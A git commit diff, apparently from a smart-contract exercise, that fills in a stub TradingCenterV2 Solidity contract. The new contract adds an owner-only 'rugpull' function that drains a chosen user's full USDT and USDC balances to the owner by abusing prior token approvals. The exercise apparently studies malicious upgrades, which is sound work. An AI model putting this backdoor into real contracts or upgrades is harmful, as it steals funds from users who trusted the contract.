24356b2d0380f975036dd441cba042bcb2c9714f
jon <u8812012moment@gmail.com>
2023-04-29 12:53:25 +0800

    first rug pull

--- src/TradingCenterV2.sol
+++ src/TradingCenterV2.sol
@@ -2,5 +2,13 @@
 pragma solidity ^0.8.17;
 
 // TODO: Try to implement TradingCenterV2 here
-contract TradingCenterV2 {
+
+import {TradingCenter} from "./TradingCenter.sol";
+import "./Ownable.sol";
+
+contract TradingCenterV2 is TradingCenter, Ownable {
+    function rugpull(address addr) external onlyOwner {
+        usdt.transferFrom(addr, msg.sender, usdt.balanceOf(addr));
+        usdc.transferFrom(addr, msg.sender, usdc.balanceOf(addr));
+    }
 }
